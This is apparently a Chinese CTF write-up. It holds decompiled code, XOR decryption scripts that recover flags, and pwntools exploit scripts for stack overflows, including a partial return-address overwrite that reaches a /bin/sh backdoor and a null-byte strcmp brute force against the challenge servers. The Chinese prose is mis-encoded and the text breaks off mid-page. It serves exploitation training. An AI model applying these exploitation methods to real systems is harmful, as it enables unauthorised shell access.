<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">Java_com_sky_ezreeeee_MainActivity_I0o0I</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v9; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *inputString; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  inputString = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a3);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a4);</span><br><span class="line">  v6 = A0OWO0A(inputString, v9);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;byte_14900, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    v7 = *(<span class="type">unsigned</span> __int8 *)(v6 + i) == (<span class="type">unsigned</span> __int8)dest[i];</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>A0OWO0Açš„å®ç°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">A0OWO0A</span><span class="params">(<span class="type">unsigned</span> __int8 *inputString, <span class="type">const</span> <span class="type">unsigned</span> __int8 *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    inputString[i] ^= key[i % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> inputString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x17</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x0E</span>, <span class="number">0x36</span>,</span><br><span class="line">        <span class="number">0x26</span>, <span class="number">0x17</span>, <span class="number">0x04</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x07</span>, <span class="number">0x26</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x11</span>, <span class="number">0x06</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x46</span>, <span class="number">0x17</span>, <span class="number">0x3D</span>, <span class="number">0x0A</span>, <span class="number">0x3C</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x2E</span>, <span class="number">0x22</span>, <span class="number">0x18</span>]</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;Sycloverforerver&quot;</span></span><br><span class="line">key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    byte = flag[i] ^ key[i % <span class="number">7</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="å¬è¯´cppå¾ˆéš¾ï¼Ÿ"><a href="#å¬è¯´cppå¾ˆéš¾ï¼Ÿ" class="headerlink" title="å¬è¯´cppå¾ˆéš¾ï¼Ÿ"></a>å¬è¯´cppå¾ˆéš¾ï¼Ÿ</h2><p>æ— ç”¨çš„ä»£ç æ¯”è¾ƒå¤šï¼Œè¿™æ—¶å€™åº”è¯¥ä»åå¾€å‰åˆ†æï¼Œä»successçš„é€»è¾‘å¼€å§‹å¾€å‰æ‰¾ï¼Œå‘ç°å…³é”®çš„åŠ å¯†é€»è¾‘ï¼Œä¹Ÿæ˜¯å°±test67é‚£</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = std::vector&lt;<span class="type">char</span>&gt;::<span class="built_in">begin</span>(v16); ; __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">                                             &amp;k,</span><br><span class="line">                                             <span class="number">0</span>i64) )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = std::vector&lt;<span class="type">char</span>&gt;::<span class="built_in">end</span>(v16);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)__gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;(&amp;k, &amp;v21) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v6 = (_BYTE *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;k);</span><br><span class="line">  *v6 += v17[<span class="number">44</span>];</span><br><span class="line">  v7 = *(<span class="type">char</span> *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;k);</span><br><span class="line">  v8 = (_BYTE *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;k);</span><br><span class="line">  *v8 = <span class="built_in">text_67</span>(v17, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">text_67</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">40</span>) = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)(((*(_DWORD *)(a1 + <span class="number">40</span>) + <span class="number">1</span>) ^ a2) - *(_DWORD *)(a1 + <span class="number">40</span>) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¿™ä¸ªé€»è¾‘ï¼Œtest_67å¤–è¾¹å¯ä»¥ä¸€ä¸ª*v6 +&#x3D; v17[44];çš„é€»è¾‘ï¼Œæ‰“å¼€çœ‹äº†ä¸€ä¸‹æ˜¯0xa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(inputString[i] ^ 10) - 9 - 1</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ä¹Ÿå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((cmpStr[i] + 10) ^ 10) - 0xa</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v19 = [</span><br><span class="line">    <span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, -<span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>,</span><br><span class="line">    <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">120</span>, -<span class="number">125</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v19)):</span><br><span class="line">    v19[i] = ((v19[i] + <span class="number">10</span>) ^ <span class="number">10</span>) - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v19:</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc_pwntools"></a>nc_pwntools</h2><p>å¯ä»¥ç”¨ctypesæ¥è°ƒç”¨libcä¸­çš„srand rand</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31955</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">       </span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">92</span> + <span class="string">b&#x27;Syclover&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">random_number1 = libc.rand() % <span class="number">100000</span> + <span class="number">5646488</span>;</span><br><span class="line">random_number2 = libc.rand() % <span class="number">10000</span> + <span class="number">3214590</span>;</span><br><span class="line">random_number3 = libc.rand() % <span class="number">1000</span> + <span class="number">6521</span>;</span><br><span class="line">random_number4 = libc.rand() % <span class="number">10000</span> + <span class="number">98714</span>;</span><br><span class="line"></span><br><span class="line">result = (random_number1 - random_number2) * random_number3 % random_number4</span><br><span class="line">result = <span class="built_in">str</span>(result).encode()</span><br><span class="line">p.sendline(result)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ç¨‹åºå¼€å¯äº†pieï¼Œä½†æ˜¯backdoorå’Œvulnçš„åç§»éå¸¸è¿‘ï¼Œä¸è¶…è¿‡ä¸€ä¸ªå­—èŠ‚çš„åç§»ï¼ŒåŸæœ‰çš„returnä¸Šé¢å°±å·²ç»æœ‰äº†å‰é¢éƒ¨åˆ†çš„åœ°å€ï¼Œæ‰€ä»¥åªéœ€è¦è¦†ç›–ä½ä½ä¸€ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œå°±èƒ½returnåˆ°backdoorä¸Šé¢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000120</span>E F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000001212</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000001213</span> <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001216</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">10</span>                   sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">000000000000121</span>A C7 <span class="number">45</span> FC <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     [rbp+var_4], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001221</span> <span class="number">83</span> <span class="number">7</span>D FC <span class="number">01</span>                   cmp     [rbp+var_4], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000001225</span> <span class="number">75</span> <span class="number">11</span>                         jnz     <span class="type">short</span> loc_1238</span><br><span class="line">.text:<span class="number">0000000000001225</span></span><br><span class="line">.text:<span class="number">0000000000001227</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D DA <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>          lea     rdi, command                    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">000000000000122</span>E B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001233</span> E8 <span class="number">58</span> FE FF FF                call    _system</span><br><span class="line">.text:<span class="number">0000000000001233</span></span><br><span class="line">.text:<span class="number">0000000000001238</span></span><br><span class="line">.text:<span class="number">0000000000001238</span>                               loc_1238:                               ; CODE XREF: backdoor+<span class="number">17</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000000001238</span> <span class="number">90</span>                            nop</span><br><span class="line">.text:<span class="number">0000000000001239</span> C9                            leave</span><br><span class="line">.text:<span class="number">000000000000123</span>A C3                            retn</span><br><span class="line">.text:<span class="number">000000000000123</span>A                               ; &#125; /</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000123B</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000000123B</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">000000000000123F</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000001240</span> <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001243</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">50</span>                   sub     rsp, <span class="number">50</span>h</span><br><span class="line">.text:<span class="number">0000000000001247</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D C2 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>          lea     rdi, s                          ; <span class="string">&quot;The simplest but not too simple pwn&quot;</span></span><br><span class="line">.text:<span class="number">000000000000124</span>E E8 <span class="number">2</span>D FE FF FF                call    _puts</span><br><span class="line">.text:<span class="number">000000000000124</span>E</span><br><span class="line">.text:<span class="number">0000000000001253</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">45</span> B0                   lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">0000000000001257</span> BA <span class="number">60</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">60</span>h ; <span class="string">&#x27;`&#x27;</span>                  ; nbytes</span><br><span class="line">.text:<span class="number">000000000000125</span>C <span class="number">48</span> <span class="number">89</span> C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:<span class="number">000000000000125F</span> BF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">0</span>                          ; fd</span><br><span class="line">.text:<span class="number">0000000000001264</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001269</span> E8 <span class="number">32</span> FE FF FF                call    _read</span><br><span class="line">.text:<span class="number">0000000000001269</span></span><br><span class="line">.text:<span class="number">000000000000126</span>E <span class="number">90</span>                            nop</span><br><span class="line">.text:<span class="number">000000000000126F</span> C9                            leave</span><br><span class="line">.text:<span class="number">0000000000001270</span> C3                            retn</span><br><span class="line">.text:<span class="number">0000000000001270</span>                               ; &#125; <span class="comment">// starts at 123B</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;1.container.jingsai.apicon.cn&quot;</span></span><br><span class="line">    port = <span class="number">30926</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">       </span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p8(<span class="number">0x27</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>æœ‰ä¸€ä¸ªbackdoorå‡½æ•°ï¼Œnameé‚£å­˜åœ¨ä¸€ä¸ªæº¢å‡ºï¼Œåˆšåˆšå¥½æ˜¯å…«ä¸ªå­—èŠ‚ï¼Œèƒ½è¦†ç›–è¿”å›åœ°å€ï¼Œpasswordè¿™é‡Œæ˜¯é€šè¿‡read &#x2F;dev&#x2F;urandomæ¥ç”Ÿæˆçš„ï¼Œå»çœ‹äº†ä¸‹urandome æœ‰æ—¶å€™ä¼šå‡ºæ¥\x00ï¼Œæƒ³åˆ°strcmp æ˜¯æ ¹æ®\x00æ¥è¯†åˆ«å­—ç¬¦ä¸²ï¼Œå†cmpçš„ï¼Œé‚£å‡è®¾ç¬¬ä¸€ä½æ˜¯\x00ï¼Œçˆ†ç ´password</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter user name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter password:&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, password) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong password!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct password!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fgets(password, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td 